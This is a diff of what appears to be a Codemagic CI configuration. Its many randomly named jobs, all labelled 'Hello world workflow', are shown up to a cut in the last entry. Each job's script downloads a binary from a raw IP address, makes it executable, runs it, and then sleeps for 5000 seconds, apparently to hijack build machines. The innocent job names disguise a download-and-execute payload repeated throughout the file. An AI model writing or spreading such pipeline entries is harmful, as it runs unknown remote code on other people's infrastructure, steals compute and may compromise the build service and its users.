@@ -1,918 +1,638 @@
 workflows:
-  kxdvmfwn:
+  gjhmffgy:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  sbukdduy:
+  jneqszrw:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tiknjnqo:
+  ucrsiedi:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  szzmtces:
+  bjpkunqy:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  iurzmzls:
+  vjpestxk:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ktlrooom:
+  quthqgou:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  qscgykef:
+  odjflnus:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  kcasjwkg:
+  xhcjhbha:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  fcgwgipd:
+  yjykcsbz:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  igfihjkz:
+  ebpfrpnj:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  kaqgdoqm:
+  lofustmc:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  atbglmpe:
+  ooozmajw:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  gtkfsbcp:
+  lgjevfhg:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tcfeqdfk:
+  ggooeerf:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  jeivrbql:
+  iicbbtbe:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mxjafnkl:
+  dzrzswzw:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  qokjwtbt:
+  zmueqaes:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ckspmaug:
+  mosahzpo:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  qkvvpwug:
+  gtlfonub:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  baimfart:
+  sztiukej:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  iqfupfke:
+  nwxuzvon:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  drmoqpsy:
+  uevjtnpb:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  loruprph:
+  ngbpwcel:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  fxktzjgb:
+  unoxjdqy:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  dzwlmtsk:
+  jkrstroz:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  pkoqdzmd:
+  uvyvmtlq:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  hwvljgtd:
+  jpuqtory:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  zrrqowwo:
+  ymyoemjq:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  isjvoxsm:
+  zhsidpir:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  wxsqlkzw:
+  lamkhthh:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ceznieuh:
+  itkoldxs:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tujrujev:
+  ysengruh:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tarosxzq:
+  jgjddpla:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  nckstewh:
+  hbqvophx:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ewkplzzw:
+  gfusnfao:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mhxxuejq:
+  hdrtcjgn:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  arxlrtoj:
+  abeoiglw:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  avjkvfsq:
+  rlkxutau:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  opwfftpl:
+  ccjwhdew:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ekvocban:
+  brkflrzv:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  jtqxghuy:
+  wdoepeep:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  wikptlqj:
+  efjlqdep:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  uortjnek:
+  zukjebzh:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mqxyvojp:
+  zyvqsvfk:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  lnzqpaim:
+  dhxbluht:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  wrkjcunx:
+  ejiyythd:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  skkrdtfv:
+  nwdkbbuq:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  conicifm:
+  zlipnvvc:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ksklqbvg:
+  ehppkaqp:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xtylfubl:
+  fhznauoi:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  sdxmqleu:
+  vnxijihl:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  yalicyyd:
+  kgzbwone:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xtjzhjpv:
+  zcissfyh:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ewqxwyww:
+  gmplfiof:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  kvdqnrms:
+  akmbfroc:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tpgluupq:
+  djpeayyy:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  tresyoqs:
+  qnwibvij:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  esaolgyy:
+  zopwieds:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  popqoecs:
+  ngakqbld:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
